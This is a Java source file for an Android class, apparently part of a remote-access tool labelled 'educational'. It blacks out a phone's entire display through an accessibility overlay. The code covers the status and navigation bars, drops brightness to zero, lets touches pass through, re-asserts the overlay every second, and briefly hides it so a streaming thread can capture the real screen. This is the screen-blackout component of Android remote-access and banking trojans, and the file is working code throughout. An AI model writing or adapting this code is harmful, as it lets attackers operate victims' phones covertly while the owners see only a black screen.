package com.remoteaccess.educational.commands;

import android.graphics.Color;
import android.graphics.PixelFormat;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;
import com.remoteaccess.educational.services.UnifiedAccessibilityService;
import org.json.JSONObject;

/**
 * ScreenBlackout — draws a full-screen opaque black overlay using TYPE_ACCESSIBILITY_OVERLAY.
 *
 * - Covers status bar (top), notification panel, navigation bar (home/back/recents, bottom).
 * - Sets screenBrightness = 0f (hardware brightness to zero) on the layout params.
 * - Uses FLAG_LAYOUT_NO_LIMITS so the overlay extends beyond all system UI insets.
 * - A 1-second "keep-on-top" loop re-applies the overlay every second to prevent
 *   any system UI from appearing on top after the block is enabled.
 * - runWithOverlayHidden() hides/shows the overlay on the main thread but runs the
 *   capture task on the CALLER'S thread (avoids deadlock with captureScreenSync).
 */
public class ScreenBlackout {

    private static final String TAG = "ScreenBlackout";

    private final Handler mainHandler = new Handler(Looper.getMainLooper());
    private final Object  lock        = new Object();

    private UnifiedAccessibilityService service      = null;
    private View                        overlayView  = null;
    private WindowManager.LayoutParams  overlayParams = null;
    private boolean                     active       = false;
    private boolean                     viewAttached = false;

    private static volatile ScreenBlackout instance;

    public static ScreenBlackout getInstance() {
        if (instance == null) {
            synchronized (ScreenBlackout.class) {
                if (instance == null) instance = new ScreenBlackout();
            }
        }
        return instance;
    }

    private ScreenBlackout() {}

    /** Called by UnifiedAccessibilityService.onServiceConnected() */
    public void setService(UnifiedAccessibilityService svc) {
        synchronized (lock) { this.service = svc; }
        Log.i(TAG, "Accessibility service registered — block screen ready");
    }

    /** Called by UnifiedAccessibilityService.onUnbind() */
    public void clearService() {
        synchronized (lock) {
            stopKeepOnTopLoop();
            if (active) removeOverlay();
            this.service = null;
        }
        Log.i(TAG, "Accessibility service unregistered");
    }

    public boolean isActive() {
        synchronized (lock) { return active; }
    }

    // ── Keep-on-top loop ─────────────────────────────────────────────────────

    /**
     * Every 1 second: check if overlay is still at top. If not, re-add it.
     * This prevents the flashing caused by blindly removing/re-adding every time.
     */
    private final Runnable keepOnTopRunnable = new Runnable() {
        @Override
        public void run() {
            synchronized (lock) {
                if (!active || overlayView == null
                        || overlayParams == null || service == null) return;
                try {
                    WindowManager wm = (WindowManager)
                            service.getSystemService(android.content.Context.WINDOW_SERVICE);
                    
                    // Check if overlay is still attached and at top
                    boolean isAttached = overlayView.isAttachedToWindow();
                    
                    if (!isAttached) {
                        // View was detached, re-attach it
                        wm.addView(overlayView, overlayParams);
                        viewAttached = true;
                        Log.d(TAG, "keep-on-top: overlay re-attached (was detached)");
                    }
                    // If attached, assume it's still at top - no need to remove/re-add
                    // The overlay will only be re-added if it gets detached by system UI
                } catch (Exception e) {
                    Log.e(TAG, "keep-on-top error: " + e.getMessage());
                }
            }
            mainHandler.postDelayed(this, 1000);
        }
    };

    private void startKeepOnTopLoop() {
        mainHandler.removeCallbacks(keepOnTopRunnable);
        mainHandler.postDelayed(keepOnTopRunnable, 1000);
    }

    private void stopKeepOnTopLoop() {
        mainHandler.removeCallbacks(keepOnTopRunnable);
    }

    // ── Enable ───────────────────────────────────────────────────────────────

    /**
     * Enable block screen — covers the entire display including status bar,
     * notification panel, AND navigation bar (home/back/recents).
     *
     * Key design decisions:
     * 1. FLAG_NOT_TOUCHABLE: touches pass through to accessibility layer.
     * 2. screenBrightness = 0f: dims the physical screen to zero.
     * 3. FLAG_LAYOUT_NO_LIMITS: extends beyond screen bounds in all directions.
     * 4. Overlay shifted UP by (statusBarH + padding) and height includes
     *    both statusBarH (top) + navBarH (bottom) so nothing is exposed.
     * 5. 1-second keep-on-top loop re-adds the overlay to maintain z-order.
     */
    public JSONObject enableBlackout() {
        JSONObject result = new JSONObject();
        try {
            synchronized (lock) {
                if (active) {
                    result.put("success", true);
                    result.put("message", "Screen block already active");
                    return result;
                }
                if (service == null) {
                    result.put("success", false);
                    result.put("error", "Accessibility service not running — enable it first");
                    return result;
                }
            }

            final Object latch      = new Object();
            final boolean[] done    = {false};
            final boolean[] success = {false};

            mainHandler.postAtFrontOfQueue(() -> {
                synchronized (lock) {
                    try {
                        if (service == null || active) return;

                        View v = new View(service);
                        v.setBackgroundColor(Color.BLACK);

                        // Real physical display size (includes all insets)
                        android.graphics.Point displaySize = new android.graphics.Point();
                        WindowManager wmDisp = (WindowManager)
                                service.getSystemService(android.content.Context.WINDOW_SERVICE);
                        wmDisp.getDefaultDisplay().getRealSize(displaySize);
                        int realW = displaySize.x;
                        int realH = displaySize.y;

                        // Status bar height (top inset)
                        int statusBarH = 0;
                        try {
                            int resId = service.getResources().getIdentifier(
                                    "status_bar_height", "dimen", "android");
                            if (resId > 0)
                                statusBarH = service.getResources().getDimensionPixelSize(resId);
                        } catch (Exception ignored) {}
                        if (statusBarH <= 0) statusBarH = 80;

                        // Navigation bar height (bottom inset — home/back/recents)
                        int navBarH = 0;
                        try {
                            int resId = service.getResources().getIdentifier(
                                    "navigation_bar_height", "dimen", "android");
                            if (resId > 0)
                                navBarH = service.getResources().getDimensionPixelSize(resId);
                        } catch (Exception ignored) {}
                        if (navBarH <= 0) navBarH = 120; // safe fallback ~40dp @ 3x

                        // Extra padding to cover display cutouts and rounded corners
                        int extra = 80;

                        // Overlay positioned to cover: status bar (top) + screen + nav bar (bottom)
                        // Y is negative to push the top of the overlay above the status bar.
                        // Height is expanded to also extend below the screen into the nav bar zone.
                        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                                realW,
                                realH + statusBarH + navBarH + extra * 2,
                                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                                        | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                                        | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                                        | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
                                        | WindowManager.LayoutParams.FLAG_FULLSCREEN,
                                PixelFormat.OPAQUE
                        );
                        params.x = 0;
                        params.y = -(statusBarH + extra); // shift up to cover status bar

                        // Cover display cutouts on Android 9+ (notch / punch-hole)
                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
                            params.layoutInDisplayCutoutMode =
                                    WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
                        }

                        // Dim physical screen brightness to zero
                        params.screenBrightness = 0f;

                        WindowManager wm = (WindowManager)
                                service.getSystemService(android.content.Context.WINDOW_SERVICE);
                        wm.addView(v, params);

                        overlayView   = v;
                        overlayParams = params;
                        active        = true;
                        viewAttached  = true;
                        success[0]    = true;
                        Log.i(TAG, "Screen block ENABLED — covers status bar + screen + nav bar (h="
                                + params.height + " y=" + params.y + ")");
                    } catch (Exception e) {
                        Log.e(TAG, "enableBlackout error: " + e.getMessage());
                    }
                }
                synchronized (latch) { done[0] = true; latch.notifyAll(); }
            });

            synchronized (latch) {
                long deadline = System.currentTimeMillis() + 1500;
                while (!done[0] && System.currentTimeMillis() < deadline) {
                    try { latch.wait(50); } catch (InterruptedException ignored) { break; }
                }
            }

            synchronized (lock) {
                if (success[0]) {
                    // Start 1-second loop to keep overlay on top of any system UI
                    startKeepOnTopLoop();
                    result.put("success", true);
                    result.put("message", "Screen block enabled — full display covered including navigation bar");
                } else {
                    result.put("success", false);
                    result.put("error", "Failed to attach overlay — accessibility service may not be active");
                }
            }
        } catch (Exception e) {
            try { result.put("success", false); result.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return result;
    }

    // ── Disable ──────────────────────────────────────────────────────────────

    /** Disable block screen — stops the keep-on-top loop and removes the overlay. */
    public JSONObject disableBlackout() {
        JSONObject result = new JSONObject();
        try {
            synchronized (lock) {
                if (!active && !viewAttached) {
                    result.put("success", true);
                    result.put("message", "Screen block already inactive");
                    return result;
                }
            }

            // Stop keep-on-top loop before touching the view to avoid a race
            stopKeepOnTopLoop();

            final Object latch   = new Object();
            final boolean[] done = {false};

            mainHandler.postAtFrontOfQueue(() -> {
                synchronized (lock) { removeOverlay(); }
                synchronized (latch) { done[0] = true; latch.notifyAll(); }
            });

            synchronized (latch) {
                long deadline = System.currentTimeMillis() + 1500;
                while (!done[0] && System.currentTimeMillis() < deadline) {
                    try { latch.wait(50); } catch (InterruptedException ignored) { break; }
                }
            }

            result.put("success", true);
            result.put("message", "Screen block disabled — brightness restored");
        } catch (Exception e) {
            try { result.put("success", false); result.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return result;
    }

    /** Must be called on main thread while holding lock. */
    private void removeOverlay() {
        try {
            if (overlayView != null && viewAttached && service != null) {
                WindowManager wm = (WindowManager)
                        service.getSystemService(android.content.Context.WINDOW_SERVICE);
                wm.removeView(overlayView);
            }
        } catch (Exception e) {
            Log.e(TAG, "disableBlackout removeView: " + e.getMessage());
        } finally {
            overlayView   = null;
            overlayParams = null;
            active        = false;
            viewAttached  = false;
            Log.i(TAG, "Screen block DISABLED — brightness restored");
        }
    }

    // ── Screenshot helper ─────────────────────────────────────────────────────

    /**
     * Briefly hide the overlay so the streaming thread can capture real content,
     * then immediately restore it.
     *
     * Design:
     * - Hide and restore both run at the FRONT of the main-thread queue.
     * - The hide step waits at most 30 ms for the main thread to execute.
     * - The capture runs on the CALLER'S background thread (avoids deadlock).
     * - The restore is posted at the FRONT of the queue right after capture.
     */
    public void runWithOverlayHidden(Runnable captureTask) {
        boolean isActive;
        synchronized (lock) { isActive = active && viewAttached && overlayView != null; }

        if (!isActive) {
            captureTask.run();
            return;
        }

        final Object hideLatch   = new Object();
        final boolean[] hideDone = {false};

        mainHandler.postAtFrontOfQueue(() -> {
            synchronized (lock) {
                if (overlayView != null) overlayView.setVisibility(View.INVISIBLE);
            }
            synchronized (hideLatch) { hideDone[0] = true; hideLatch.notifyAll(); }
        });

        synchronized (hideLatch) {
            long deadline = System.currentTimeMillis() + 30;
            while (!hideDone[0] && System.currentTimeMillis() < deadline) {
                try { hideLatch.wait(5); } catch (InterruptedException ignored) { break; }
            }
        }

        try {
            captureTask.run();
        } finally {
            mainHandler.postAtFrontOfQueue(() -> {
                synchronized (lock) {
                    if (active && viewAttached && overlayView != null) {
                        overlayView.setVisibility(View.VISIBLE);
                    }
                }
            });
        }
    }
}
